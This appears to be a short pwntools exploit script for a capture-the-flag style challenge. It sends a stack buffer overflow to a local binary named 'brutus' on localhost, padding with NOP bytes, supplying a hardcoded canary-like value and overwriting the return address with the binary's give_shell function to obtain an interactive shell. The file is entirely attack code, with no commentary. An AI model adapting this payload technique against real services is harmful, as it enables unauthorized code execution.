#to get the shell
from pwn import*

#p = process('./school')
p = remote('localhost', 8000)
e = ELF('./brutus')
#p.recv()
#p.send("aa6243\n")
#gdb.attach(p)
p.recv()
p.send("500")
nop = asm('nop', arch="amd64")
p.recv()
p.send(nop*136 + '\x00\xce\xbf\x38\xc4\xf0\xc6\x4f' + nop*8 + p64(e.symbols['give_shell']))
p.interactive() 
